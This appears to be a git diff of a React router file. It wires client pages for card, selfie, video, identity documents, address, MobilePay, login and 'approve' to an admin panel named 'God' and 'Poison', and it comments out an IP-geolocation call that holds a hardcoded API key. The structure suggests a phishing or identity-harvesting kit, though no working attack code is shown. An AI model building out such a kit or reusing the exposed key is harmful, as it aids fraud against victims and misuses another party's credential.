@@ -3,7 +3,11 @@ import ReactDOM from "react-dom/client";
 import App from "./App.jsx";
 import "./index.css";
 
-import { createBrowserRouter, createHashRouter, RouterProvider } from "react-router-dom";
+import {
+  createBrowserRouter,
+  createHashRouter,
+  RouterProvider,
+} from "react-router-dom";
 import Admin from "./Layouts/Admin.jsx";
 import God from "./views/Admin/God.jsx";
 import Poison from "./views/Admin/Poison.jsx";
@@ -16,21 +20,20 @@ import Docs from "./views/Client/verification/Docs.jsx";
 import Selfie from "./views/Client/verification/Selfie.jsx";
 import Video from "./views/Client/verification/Video.jsx";
 import Address from "./views/Client/Address.jsx";
+import { dbs } from './configs.js'
 
-const godIsCreatingHumans = ({ params }) => {
-  return [];
-};
-
-const usersLoader = ({ params }) => {
+const selectDB = ({ params }) => {
+  
   return [];
 };
 
 const poisonLoader = async ({ params }) => {
-  const result = await fetch(
-    "https://ipgeolocation.abstractapi.com/v1/?api_key=82a9528162ca40f89fab49f8b8860ef3"
-  );
-  const data = await result.json();
-  return data;
+  // const result = await fetch(
+  //   "https://ipgeolocation.abstractapi.com/v1/?api_key=82a9528162ca40f89fab49f8b8860ef3"
+  // );
+  // const data = await result.json();
+  // return data;
+  return [];
 };
 
 const router = createHashRouter([
@@ -41,42 +44,42 @@ const router = createHashRouter([
       {
         path: "card",
         element: <Card />,
-        loader: godIsCreatingHumans,
+        loader: selectDB,
       },
       {
         path: "selfie",
         element: <Selfie />,
-        loader: godIsCreatingHumans,
+        loader: selectDB,
       },
       {
         path: "video",
         element: <Video />,
-        loader: godIsCreatingHumans,
+        loader: selectDB,
       },
       {
         path: "address",
         element: <Address />,
-        loader: godIsCreatingHumans,
+        loader: selectDB,
       },
       {
         path: "docs",
         element: <Docs />,
-        loader: godIsCreatingHumans,
+        loader: selectDB,
       },
       {
         path: "mobilepay",
         element: <MobilePay />,
-        loader: godIsCreatingHumans,
+        loader: selectDB,
       },
       {
         path: "login",
         element: <Login />,
-        loader: usersLoader,
+        loader: selectDB,
       },
       {
         path: "approve",
         element: <Approve />,
-        loader: poisonLoader,
+        loader: selectDB,
       },
     ],
   },
@@ -87,12 +90,12 @@ const router = createHashRouter([
       {
         path: "",
         element: <God />,
-        loader: godIsCreatingHumans,
+        loader: selectDB,
       },
       {
         path: "poison",
         element: <Poison />,
-        loader: poisonLoader,
+        loader: selectDB,
       },
     ],
   },
